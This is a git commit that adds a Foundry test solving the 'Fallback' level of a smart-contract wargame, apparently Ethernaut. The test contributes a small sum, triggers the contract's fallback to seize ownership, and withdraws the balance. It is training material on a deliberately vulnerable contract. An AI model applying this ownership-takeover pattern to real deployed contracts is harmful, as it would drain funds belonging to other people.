fcbcd91ebd8ec334af4ab511d5b2bbadd7b781db
sripwoud <me@sripwoud.xyz>
2022-10-26 10:49:30 +0200

    :white_check_mark: Fallback

---
+++ test/Fallback.t.sol
@@ -0,0 +1,36 @@
+pragma solidity ^0.8.0;
+
+import 'forge-std/Test.sol';
+import 'levels/FallbackFactory.sol';
+import 'levels/Fallback.sol';
+import 'utils/TestUtils.sol';
+
+contract TFallback is Test {
+  address player;
+  Utils utils;
+  FallbackFactory fallbackFactory;
+  address payable fallbackContractAddress;
+  Fallback fallbackContract;
+
+  function setUp() public {
+    utils = new Utils();
+    player = utils.createUsers(1)[0];
+    fallbackFactory = new FallbackFactory();
+    fallbackContractAddress = payable(fallbackFactory.createInstance(player));
+    fallbackContract = Fallback(fallbackContractAddress);
+  }
+
+  function testHack() public {
+    vm.prank(player);
+    fallbackContract.contribute{value : 0.0001 ether}();
+
+    vm.prank(player);
+    (bool sent,) = fallbackContractAddress.call{value: 1}("");
+    assert(sent);
+
+    vm.prank(player);
+    fallbackContract.withdraw();
+
+    fallbackFactory.validateInstance(fallbackContractAddress, player);
+  }
+}
